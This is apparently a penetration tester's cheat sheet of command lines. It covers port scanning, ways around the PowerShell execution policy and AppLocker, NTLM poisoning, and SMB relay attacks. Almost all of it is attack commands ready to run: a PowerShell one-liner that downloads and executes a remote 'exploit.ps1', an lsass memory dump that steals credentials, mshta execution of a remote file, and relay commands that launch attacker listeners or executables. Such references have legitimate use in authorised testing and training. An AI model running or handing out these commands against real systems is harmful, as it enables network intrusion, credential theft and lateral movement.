## Portscan
#### Nmap Few
```
nmap -sS -Pn -p 22,25,80,443,139,445,3306,1433,5432,1521,27001,8080,8000,8088,8443,5900,1099 --open -vvvv -iL <file> -oA nmap_few
```
#### Nmap 1k
```
nmap -sS -Pn --open -vvvv -iL <file> -oA nmap_1k
```
#### Nmap 1k
```
nmap -sS -Pn --open -vvvv -iL <file> -oA nmap_1k
```
#### Masscan + nmap version Full
```
masscan -p 1-65535 --rate 10000 --wait 0 --open -iL ip.txt -oX masscan.xml
```
```
open_ports=$(cat masscan.xml | grep portid | cut -d "\"" -f 10 | sort -n | uniq | paste -sd,)
```
```
nmap -sS -Pn -A -sV -p $open_ports --open -vvvv -n -iL ip.txt -oA nmapfull
```
#### Naabu
```
naabu -list <ip.txt> -rate 5000 -nmap-cli 'nmap -sV -oA naabu_nmap'
```

## PowerShell Execution Bypass Techniques

#### Netspi blog - https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/
```
powershell.exe -ExecutionPolicy Bypass
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1
PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1
Echo Write-Host "My voice is my passport, verify me." | PowerShell.exe -noprofile -
powershell.exe -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA

Set-ExecutionPolicy Bypass -Scope Process
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
Get-Content .runme.ps1 | Invoke-Expression
GC .runme.ps1 | iex
TYPE .runme.ps1 | PowerShell.exe -noprofile -
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.0.1/exploit.ps1')"
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
Powershell -c "Write-Host 'My voice is my passport, verify me.'"
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}
invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force
function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  .runme.ps1

```

## Bypass GPO and Applocker to execute Powershell

#### Powershx
```
https://github.com/iomoath/PowerShx
```

#### MSBuildshell
Download
```
https://github.com/Cn33liz/MSBuildShell/blob/master/MSBuildShell.csproj
```
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
Or
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
#### CScriptShell
```
https://github.com/Cn33liz/CScriptShell
```
#### Powershdll
```
https://github.com/p3nt4/PowerShdll
```
#### SyncAppvPublishingServer
```
SyncAppvPublishingServer.vbs "Break; mshta <remote file>"
```
#### Powerline
```
https://github.com/fullmetalcache/PowerLine
```
```
PowerLine.exe Out-Minidump "Get-Process lsass | Out-Minidump"
```
```
PowerLine.exe PowerUp "Invoke-AllChecks"
```

## Poisoning Attack

#### Responder
```
responder -I eth0
```
#### IPv6 DHCP Rogue Server 
Install Mitm6
```
pip install mitm6
```

```
mitm6 -i eth0
```

#### Generate SMB Signing Disabled Hosts
```
crackmapexec smb --gen-relay-list smb_sigb_disabled.txt ranges.txt
```
#### Relay Attacks 
ntlmrelayx
```
python3 ntlmrelayx.py -smb2support -tf filename
```
ntlmrelayx Comamnd execution
```
python3 ntlmrelayx.py -smb2support -tf filename -c <msf or koadic listener here>
```
Multirelay
```
python3 MultiRelay.py -t IP -u ALL
```
SMBrelay
```
python3 smbrelayx.py -h IP -c <command>
```
```
python3 smbrelayx.py -h IP -e <executable>
```
